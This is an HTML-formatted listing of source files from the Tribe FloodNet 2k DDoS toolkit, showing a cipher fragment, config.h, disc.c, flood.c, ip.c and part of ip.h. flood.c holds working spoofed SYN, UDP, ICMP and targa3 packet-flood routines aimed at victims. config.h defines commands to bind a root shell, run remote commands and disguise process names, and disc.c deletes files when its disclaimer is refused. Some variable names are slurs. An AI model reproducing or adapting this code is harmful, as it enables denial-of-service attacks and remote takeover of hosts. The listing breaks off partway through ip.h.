<br><font color="#3333FF">&nbsp; f_rnd (blk, 64);</font>
<br><font color="#3333FF">&nbsp; f_rnd (blk, 56);</font>
<br><font color="#3333FF">&nbsp; f_rnd (blk, 48);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 40);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 32);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 24);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 16);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 8);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 0);</font>
<p><font color="#3333FF">&nbsp; out_blk[0] = io_swap (blk[0]);</font>
<br><font color="#3333FF">&nbsp; out_blk[1] = io_swap (blk[1]);</font>
<br><font color="#3333FF">&nbsp; out_blk[2] = io_swap (blk[2]);</font>
<br><font color="#3333FF">&nbsp; out_blk[3] = io_swap (blk[3]);</font>
<br><font color="#3333FF">}</font>
<br>
<hr WIDTH="100%">
<center><font color="#FF0000"><font size=+1>config.h</font></font></center>

<p><font color="#FF0000">/*</font>
<br><font color="#FF0000">&nbsp;* Tribe FloodNet - 2k edition</font>
<br><font color="#FF0000">&nbsp;* by Mixter &lt;mixter@newyorkoffice.com></font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* config.h - user defined values</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* This program is distributed for educational
purposes and without any</font>
<br><font color="#FF0000">&nbsp;* explicit or implicit warranty; in no
event shall the author or</font>
<br><font color="#FF0000">&nbsp;* contributors be liable for any direct,
indirect or incidental damages</font>
<br><font color="#FF0000">&nbsp;* arising in any way out of the use of
this software.</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;*/</font>
<p><font color="#FF0000">#ifndef _CONFIG_H</font>
<p><font color="#FF0000">#define HIDEME "tfn-daemon" /* background process
name */</font>
<br><font color="#FF0000">#define HIDEKIDS "tfn-child" /* flood/shell thread
names */</font>
<br><font color="#FF0000">#define CHLD_MAX 50&nbsp; /* maximum targets
a server handles at a time */</font>
<br><font color="#FF0000">#define DELIMITER "@"&nbsp; /* to separate ips
and broadcasts (host1@host2@...) */</font>
<br><font color="#FF0000">#define REQUIRE_PASS&nbsp; /* require server
password to be entered and</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; verified
before the client will work? */</font>
<p><font color="#FF0000">#undef ATTACKLOG "attack.log" /* keep server side
logs of attacked victims */</font>
<p><font color="#FF0000">/* Note: the password is not defined here, but
at compile time. The</font>
<br><font color="#FF0000">&nbsp;&nbsp; requests will be encrypted anyways,
you DON'T need to change this */</font>
<p><font color="#FF0000">#define PROTO_SEP '+' /* session header separator,
can be anything */</font>
<br><font color="#FF0000">#define ID_SHELL 'a' /* to bind a root shell
*/</font>
<br><font color="#FF0000">#define ID_PSIZE 'b' /* to change size of udp/icmp
packets */</font>
<br><font color="#FF0000">#define ID_SWITCH 'c' /* to switch spoofing mode
*/</font>
<br><font color="#FF0000">#define ID_STOPIT 'd' /* to stop flooding */</font>
<br><font color="#FF0000">#define ID_SENDUDP 'e' /* to udp flood */</font>
<br><font color="#FF0000">#define ID_SENDSYN 'f' /* to syn flood */</font>
<br><font color="#FF0000">#define ID_SYNPORT 'g' /* to set port */</font>
<br><font color="#FF0000">#define ID_ICMP&nbsp; 'h' /* to icmp flood */</font>
<br><font color="#FF0000">#define ID_SMURF 'i' /* haps! haps! */</font>
<br><font color="#FF0000">#define ID_TARGA 'j' /* targa3 (ip stack penetration)
*/</font>
<br><font color="#FF0000">#define ID_MIX&nbsp; 'k' /* udp/syn/icmp intervals
*/</font>
<br><font color="#FF0000">#define ID_REXEC 'l' /* execute system command
*/</font>
<p><font color="#FF0000">#define _CONFIG_H</font>
<br><font color="#FF0000">#endif</font>
<br>
<hr WIDTH="100%">
<center><font color="#3333FF"><font size=+1>disc.c</font></font></center>

<p><font color="#3333FF">#include &lt;stdio.h></font>
<br><font color="#3333FF">#include &lt;unistd.h></font>
<br><font color="#3333FF">#include &lt;sys/types.h></font>
<br><font color="#3333FF">#include &lt;sys/stat.h></font>
<br><font color="#3333FF">#include &lt;fcntl.h></font>
<p><font color="#3333FF">int system (const char *string);</font>
<p><font color="#3333FF">/* Yes, this is lame, I know =P */</font>
<p><font color="#3333FF">char *disclaimer =</font>
<br><font color="#3333FF">" This program is distributed for educational
purposes and without any\n"</font>
<br><font color="#3333FF">" explicit or implicit warranty; in no event
shall the author or contributors\n"</font>
<br><font color="#3333FF">" be liable for any direct, indirect or incidental
damages arising in any way\n"</font>
<br><font color="#3333FF">" out of the use of this software.\n\n"</font>
<br><font color="#3333FF">" I hereby certify that I will not hold the author
liable for any wanted\n"</font>
<br><font color="#3333FF">" or unwanted effects caused by this program
and that I will give the author\n"</font>
<br><font color="#3333FF">" full credit and exclusively use this program
for educational purposes.\n\n";</font>
<p><font color="#3333FF">int</font>
<br><font color="#3333FF">main (void)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; if (open ("agreed", O_RDONLY) >= 0)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#3333FF">&nbsp; printf ("%s\nDo you agree to this disclaimer
[y/n]? ", disclaimer);</font>
<br><font color="#3333FF">&nbsp; switch (getchar ())</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 'y':</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 'Y':</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close (open ("agreed",
O_WRONLY | O_CREAT | O_TRUNC));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; default:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; system ("/bin/rm
-f ./*");</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp; return (0);</font>
<br><font color="#3333FF">}</font>
<br>
<hr WIDTH="100%">
<center><font color="#FF0000"><font size=+1>flood.c</font></font></center>

<p><font color="#FF0000">/*</font>
<br><font color="#FF0000">&nbsp;* Tribe FloodNet - 2k edition</font>
<br><font color="#FF0000">&nbsp;* by Mixter &lt;mixter@newyorkoffice.com></font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* flood.c - packet flood implementations</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* This program is distributed for educational
purposes and without any</font>
<br><font color="#FF0000">&nbsp;* explicit or implicit warranty; in no
event shall the author or</font>
<br><font color="#FF0000">&nbsp;* contributors be liable for any direct,
indirect or incidental damages</font>
<br><font color="#FF0000">&nbsp;* arising in any way out of the use of
this software.</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;*/</font>
<p><font color="#FF0000">#include "tribe.h"</font>
<p><font color="#FF0000">extern int rcounter;</font>
<br><font color="#FF0000">extern char rseed[];</font>
<p><font color="#FF0000">int rawsock = 0, fw00ding = 0, nospoof = 0, port4syn
= 0, psize = 0;</font>
<br><font color="#FF0000">static char synb[8192];</font>
<br><font color="#FF0000">static int fbi = 1, cia = 65535;</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">syn (unsigned long victim, unsigned short port)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; struct sa sin;</font>
<br><font color="#FF0000">&nbsp; struct ip *ih = (struct ip *) synb;</font>
<br><font color="#FF0000">&nbsp; struct tcp *th = (struct tcp *) (synb
+ sizeof (struct ip));</font>
<br><font color="#FF0000">&nbsp; ih->ver = 4;</font>
<br><font color="#FF0000">&nbsp; ih->ihl = 5;</font>
<br><font color="#FF0000">&nbsp; ih->tos = 0x00;</font>
<br><font color="#FF0000">&nbsp; ih->tl = sizeof (ih) + sizeof (th);</font>
<br><font color="#FF0000">&nbsp; ih->id = htons (getrandom (1024, 65535));</font>
<br><font color="#FF0000">&nbsp; ih->off = 0;</font>
<br><font color="#FF0000">&nbsp; ih->ttl = getrandom (200, 255);</font>
<br><font color="#FF0000">&nbsp; ih->pro = TCP;</font>
<br><font color="#FF0000">&nbsp; ih->sum = 0;</font>
<br><font color="#FF0000">&nbsp; ih->src = k00lip ();</font>
<br><font color="#FF0000">&nbsp; ih->dst = victim;</font>
<br><font color="#FF0000">&nbsp; th->src = htons (getrandom (0, 65535));</font>
<br><font color="#FF0000">&nbsp; if (port > 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; th->dst = htons (port);</font>
<br><font color="#FF0000">&nbsp; else</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; th->dst = htons (getrandom
(0, 65535));</font>
<br><font color="#FF0000">&nbsp; th->seq = htonl (getrandom (0, 65535)
+ (getrandom (0, 65535) &lt;&lt; 8));</font>
<br><font color="#FF0000">&nbsp; th->ack = htons (getrandom (0, 65535));</font>
<br><font color="#FF0000">&nbsp; th->flg = SYN | URG;</font>
<br><font color="#FF0000">&nbsp; th->win = htons (getrandom (0, 65535));</font>
<br><font color="#FF0000">&nbsp; th->sum = 0;</font>
<br><font color="#FF0000">&nbsp; th->urp = htons (getrandom (0, 65535));</font>
<br><font color="#FF0000">&nbsp; th->sum = ip_sum ((u16 *) synb, (sizeof
(struct ip) + sizeof (struct tcp) + 1) &amp; ~1);</font>
<br><font color="#FF0000">&nbsp; ih->sum = ip_sum ((u16 *) synb, (4 * ih->ihl
+ sizeof (struct tcp) + 1) &amp; ~1);</font>
<br><font color="#FF0000">&nbsp; sin.fam = AF_INET;</font>
<br><font color="#FF0000">&nbsp; sin.dp = th->dst;</font>
<br><font color="#FF0000">&nbsp; sin.add = ih->dst;</font>
<br><font color="#FF0000">&nbsp; sendto (rawsock, synb, 4 * ih->ihl + sizeof
(struct tcp), 0, (struct sockaddr *) &amp;sin, sizeof (sin));</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">udp (unsigned long lamer)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int tot_len = sizeof (struct ip) + sizeof
(struct udp) + 1 + psize;</font>
<br><font color="#FF0000">&nbsp; struct sa llama;</font>
<br><font color="#FF0000">&nbsp; struct</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct ip iph;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct udp udph;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unsigned char
evil[65535];</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; faggot;</font>
<p><font color="#FF0000">&nbsp; faggot.evil[psize] = '\0';</font>
<p><font color="#FF0000">&nbsp; if (fbi++ > 65535)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; fbi = 1;</font>
<br><font color="#FF0000">&nbsp; if (cia-- &lt; 1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; cia = 65535;</font>
<p><font color="#FF0000">&nbsp; faggot.iph.ihl = 5;</font>
<br><font color="#FF0000">&nbsp; faggot.iph.ver = 4;</font>
<br><font color="#FF0000">&nbsp; faggot.iph.tos = 0x00;</font>
<br><font color="#FF0000">&nbsp; faggot.iph.tl = htons (tot_len);</font>
<br><font color="#FF0000">&nbsp; faggot.iph.id = htons (getrandom (0, 65535));</font>
<br><font color="#FF0000">&nbsp; faggot.iph.off = 0;</font>
<br><font color="#FF0000">&nbsp; faggot.iph.ttl = getrandom (200, 255);</font>
<br><font color="#FF0000">&nbsp; faggot.iph.pro = UDP;</font>
<br><font color="#FF0000">&nbsp; faggot.iph.src = k00lip ();</font>
<br><font color="#FF0000">&nbsp; faggot.iph.dst = lamer;</font>
<br><font color="#FF0000">&nbsp; faggot.iph.sum = ip_sum ((u16 *) &amp;
faggot.iph, sizeof (faggot.iph));</font>
<p><font color="#FF0000">&nbsp; faggot.udph.src = htons (cia);</font>
<br><font color="#FF0000">&nbsp; faggot.udph.dst = htons (fbi);</font>
<br><font color="#FF0000">&nbsp; faggot.udph.len = htons (sizeof (faggot.udph)
+ 1 + psize);</font>
<br><font color="#FF0000">&nbsp; faggot.udph.sum = 0;</font>
<br><font color="#FF0000">&nbsp; faggot.udph.sum = cksum ((u16 *) &amp;
faggot.udph, tot_len >> 1);</font>
<p><font color="#FF0000">&nbsp; llama.fam = AF_INET;</font>
<br><font color="#FF0000">&nbsp; llama.dp = faggot.udph.dst;</font>
<br><font color="#FF0000">&nbsp; llama.add = lamer;</font>
<p><font color="#FF0000">&nbsp; sendto (rawsock, &amp;faggot, tot_len,
0, (struct sockaddr *) &amp;llama, sizeof (llama));</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">icmp (unsigned long lamer, unsigned long src)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; struct sa pothead;</font>
<br><font color="#FF0000">&nbsp; struct ip *iph;</font>
<br><font color="#FF0000">&nbsp; struct icmp *icmph;</font>
<br><font color="#FF0000">&nbsp; char *packet;</font>
<br><font color="#FF0000">&nbsp; int pktsize = sizeof (struct ip) + sizeof
(struct icmp) + 64;</font>
<p><font color="#FF0000">&nbsp; if (psize)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; pktsize += psize;</font>
<p><font color="#FF0000">&nbsp; packet = malloc (pktsize);</font>
<br><font color="#FF0000">&nbsp; iph = (struct ip *) packet;</font>
<br><font color="#FF0000">&nbsp; icmph = (struct icmp *) (packet + sizeof
(struct ip));</font>
<br><font color="#FF0000">&nbsp; memset (packet, 0, pktsize);</font>
<br><font color="#FF0000">&nbsp; iph->ver = 4;</font>
<br><font color="#FF0000">&nbsp; iph->ihl = 5;</font>
<br><font color="#FF0000">&nbsp; iph->tos = 0;</font>
<br><font color="#FF0000">&nbsp; iph->tl = htons (pktsize);</font>
<br><font color="#FF0000">&nbsp; iph->id = htons (getpid ());</font>
<br><font color="#FF0000">&nbsp; iph->off = 0;</font>
<br><font color="#FF0000">&nbsp; iph->ttl = 0x0;</font>
<br><font color="#FF0000">&nbsp; iph->pro = ICMP;</font>
<br><font color="#FF0000">&nbsp; iph->sum = 0;</font>
<br><font color="#FF0000">&nbsp; if (src == 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iph->src = k00lip
();</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iph->dst = lamer;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; else</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iph->src = lamer;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iph->dst = src;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; icmph->type = ICMP_ECHO;</font>
<br><font color="#FF0000">&nbsp; icmph->code = 0;</font>
<br><font color="#FF0000">&nbsp; icmph->sum = htons (~(ICMP_ECHO &lt;&lt;
8));</font>
<p><font color="#FF0000">&nbsp; pothead.fam = AF_INET;</font>
<br><font color="#FF0000">&nbsp; pothead.dp = htons (0);</font>
<br><font color="#FF0000">&nbsp; pothead.add = iph->dst;</font>
<p><font color="#FF0000">&nbsp; sendto (rawsock, packet, pktsize, 0, (struct
sockaddr *) &amp;pothead, sizeof (struct sockaddr));</font>
<br><font color="#FF0000">&nbsp; free (packet);</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">targa3 (unsigned long victim)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int mysize = sizeof (struct ip) + getrandom
(128, 512) + psize, i;</font>
<br><font color="#FF0000">&nbsp; char *packet = calloc (1, mysize);</font>
<br><font color="#FF0000">&nbsp; struct ip *iph = (struct ip *) packet;</font>
<br><font color="#FF0000">&nbsp; struct udp *udh = (struct udp *) (packet
+ sizeof (struct ip));</font>
<br><font color="#FF0000">&nbsp; struct tcp *tch = (struct tcp *) (packet
+ sizeof (struct ip));</font>
<br><font color="#FF0000">&nbsp; struct icmp *ich = (struct icmp *) (packet
+ sizeof (struct ip));</font>
<br><font color="#FF0000">&nbsp; struct sa sin;</font>
<p><font color="#FF0000">&nbsp; int proto[14] =</font>
<br><font color="#FF0000">&nbsp; {&nbsp;&nbsp;&nbsp; /* known internet
protcols */</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; 0, 1, 2, 4, 6, 8, 12, 17,
22, 41, 58, 255, 0,</font>
<br><font color="#FF0000">&nbsp; };</font>
<br><font color="#FF0000">&nbsp; int frags[10] =</font>
<br><font color="#FF0000">&nbsp; {&nbsp;&nbsp;&nbsp; /* (un)common fragment
values */</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; 0, 0, 0, 8192, 0x4, 0x6, 16383,
1, 0,</font>
<br><font color="#FF0000">&nbsp; };</font>
<br><font color="#FF0000">&nbsp; int flags[7] =</font>
<br><font color="#FF0000">&nbsp; {&nbsp;&nbsp;&nbsp; /* (un)common message
flags */</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; 0, 0, 0, 0x4, 0, 0x1,</font>
<br><font color="#FF0000">&nbsp; };</font>
<p><font color="#FF0000">&nbsp; for (i = 0; i &lt; mysize; i++)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (rcounter--
&lt; 1)</font>
<br><font color="#FF0000">&nbsp;random_init ();</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; packet[i] = rseed[rcounter];</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; proto[13] = getrandom (0, 255);</font>
<br><font color="#FF0000">&nbsp; frags[9] = getrandom (0, 8100);</font>
<br><font color="#FF0000">&nbsp; flags[6] = getrandom (0, 0xf);</font>
<br><font color="#FF0000">&nbsp; iph->ver = 4;</font>
<br><font color="#FF0000">&nbsp; iph->ihl = 5;</font>
<br><font color="#FF0000">&nbsp; iph->tos = 0;</font>
<br><font color="#FF0000">&nbsp; iph->tl = htons (mysize);</font>
<br><font color="#FF0000">&nbsp; iph->id = htons (getrandom (0, 65535)
+ (getrandom (0, 65535) &lt;&lt; 8));</font>
<br><font color="#FF0000">&nbsp; iph->ttl = 0x00;</font>
<br><font color="#FF0000">&nbsp; iph->pro = proto[(int) getrandom (0, 13)];</font>
<br><font color="#FF0000">&nbsp; switch (iph->pro)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case TCP:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->sum = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->sum = cksum
((u16 *) packet, mysize >> 1);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case ICMP:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ich->sum = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ich->sum = cksum
((u16 *) packet, mysize >> 1);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case UDP:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; udh->sum = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; udh->sum = cksum
((u16 *) packet, mysize >> 1);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; iph->off = htons (frags[(int) getrandom
(0, 9)]);</font>
<br><font color="#FF0000">&nbsp; iph->sum = 0;</font>
<br><font color="#FF0000">&nbsp; iph->src = getrandom (0, 65535) + (getrandom
(0, 65535) &lt;&lt; 8);</font>
<br><font color="#FF0000">&nbsp; iph->dst = victim;</font>
<p><font color="#FF0000">&nbsp; sin.fam = AF_INET;</font>
<br><font color="#FF0000">&nbsp; sin.dp = htons (0);</font>
<br><font color="#FF0000">&nbsp; sin.add = victim;</font>
<p><font color="#FF0000">&nbsp; sendto (rawsock,</font>
<br><font color="#FF0000">&nbsp;&nbsp; packet,</font>
<br><font color="#FF0000">&nbsp;&nbsp; mysize,</font>
<br><font color="#FF0000">&nbsp;&nbsp; flags[(int) getrandom (0, 6)],</font>
<br><font color="#FF0000">&nbsp;&nbsp; (struct sockaddr *) &amp;sin,</font>
<br><font color="#FF0000">&nbsp;&nbsp; sizeof (sin));</font>
<br><font color="#FF0000">&nbsp; free (packet);&nbsp; /* free willy */</font>
<br><font color="#FF0000">}</font>
<br>
<hr WIDTH="100%">
<center><font color="#3333FF"><font size=+1>ip.c</font></font></center>

<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;* Tribe FloodNet - 2k edition</font>
<br><font color="#3333FF">&nbsp;* by Mixter &lt;mixter@newyorkoffice.com></font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* ip.c - low level IP functions</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* This program is distributed for educational
purposes and without any</font>
<br><font color="#3333FF">&nbsp;* explicit or implicit warranty; in no
event shall the author or</font>
<br><font color="#3333FF">&nbsp;* contributors be liable for any direct,
indirect or incidental damages</font>
<br><font color="#3333FF">&nbsp;* arising in any way out of the use of
this software.</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*/</font>
<p><font color="#3333FF">#include "tribe.h"</font>
<br><font color="#3333FF">#include "ip.h"</font>
<p><font color="#3333FF">unsigned long</font>
<br><font color="#3333FF">resolve (char *host)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; struct hostent *he;</font>
<br><font color="#3333FF">&nbsp; struct sa tmp;</font>
<br><font color="#3333FF">&nbsp; if (isip (host))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return (inet_addr (host));</font>
<br><font color="#3333FF">&nbsp; he = gethostbyname (host);</font>
<br><font color="#3333FF">&nbsp; if (he)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy ((caddr_t)
&amp; tmp.add, he->h_addr, he->h_length);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp; else</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return (0);</font>
<br><font color="#3333FF">&nbsp; return (tmp.add);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">char *</font>
<br><font color="#3333FF">ntoa (u32 in)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; struct in_addr ad;</font>
<br><font color="#3333FF">&nbsp; ad.s_addr = in;</font>
<br><font color="#3333FF">&nbsp; return (inet_ntoa (ad));</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">int</font>
<br><font color="#3333FF">isip (char *ip)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; int a, b, c, d;</font>
<br><font color="#3333FF">&nbsp; sscanf (ip, "%d.%d.%d.%d", &amp;a, &amp;b,
&amp;c, &amp;d);</font>
<br><font color="#3333FF">&nbsp; if (a &lt; 0)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return 0;</font>
<br><font color="#3333FF">&nbsp; if (a > 255)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return 0;</font>
<br><font color="#3333FF">&nbsp; if (b &lt; 0)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return 0;</font>
<br><font color="#3333FF">&nbsp; if (b > 255)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return 0;</font>
<br><font color="#3333FF">&nbsp; if (c &lt; 0)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return 0;</font>
<br><font color="#3333FF">&nbsp; if (c > 255)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return 0;</font>
<br><font color="#3333FF">&nbsp; if (d &lt; 0)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return 0;</font>
<br><font color="#3333FF">&nbsp; if (d > 255)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return 0;</font>
<br><font color="#3333FF">&nbsp; return 1;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">u16</font>
<br><font color="#3333FF">cksum (u16 * buf, int nwords)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; unsigned long sum;</font>
<br><font color="#3333FF">&nbsp; for (sum = 0; nwords > 0; nwords--)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; sum += *buf++;</font>
<br><font color="#3333FF">&nbsp; sum = (sum >> 16) + (sum &amp; 0xffff);</font>
<br><font color="#3333FF">&nbsp; sum += (sum >> 16);</font>
<br><font color="#3333FF">&nbsp; return ~sum;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">unsigned short</font>
<br><font color="#3333FF">ip_sum (addr, len)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; unsigned short *addr;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; int len;</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; register int nleft = len;</font>
<br><font color="#3333FF">&nbsp; register unsigned short *w = addr;</font>
<br><font color="#3333FF">&nbsp; register int sum = 0;</font>
<br><font color="#3333FF">&nbsp; unsigned short answer = 0;</font>
<p><font color="#3333FF">&nbsp; while (nleft > 1)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sum += *w++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nleft -= 2;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp; if (nleft == 1)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(unsigned char
*) (&amp;answer) = *(unsigned char *) w;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sum += answer;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp; sum = (sum >> 16) + (sum &amp; 0xffff);</font>
<br><font color="#3333FF">&nbsp; sum += (sum >> 16);</font>
<br><font color="#3333FF">&nbsp; answer = ~sum;</font>
<br><font color="#3333FF">&nbsp; return (answer);</font>
<br><font color="#3333FF">}</font>
<br>
<hr WIDTH="100%">
<center><font color="#FF0000"><font size=+1>ip.h</font></font></center>

<p><font color="#FF0000">/*</font>
<br><font color="#FF0000">&nbsp;* Tribe FloodNet - 2k edition</font>
<br><font color="#FF0000">&nbsp;* by Mixter &lt;mixter@newyorkoffice.com></font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* ip.h - low level IP definitions</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* This program is distributed for educational
purposes and without any</font>
<br><font color="#FF0000">&nbsp;* explicit or implicit warranty; in no
event shall the author or</font>
<br><font color="#FF0000">&nbsp;* contributors be liable for any direct,
indirect or incidental damages</font>
<br><font color="#FF0000">&nbsp;* arising in any way out of the use of
this software.</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;*/</font>
<p><font color="#FF0000">#ifndef _IP_H</font>
<br><font color="#FF0000">#define _IP_H</font>
<br><font color="#FF0000">#include &lt;sys/socket.h></font>
<p><font color="#FF0000">#ifndef INADDR_ANY</font>
<br><font color="#FF0000">#define INADDR_ANY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
((unsigned) 0x00000000)</font>
<br><font color="#FF0000">#endif</font>
<p><font color="#FF0000">#ifndef IP_HDRINCL</font>
<br><font color="#FF0000">#define IP_HDRINCL 3</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">#ifndef PF_INET</font>
<br><font color="#FF0000">#define PF_INET 2</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">#ifndef AF_INET</font>
<br><font color="#FF0000">#define AF_INET PF_INET</font>
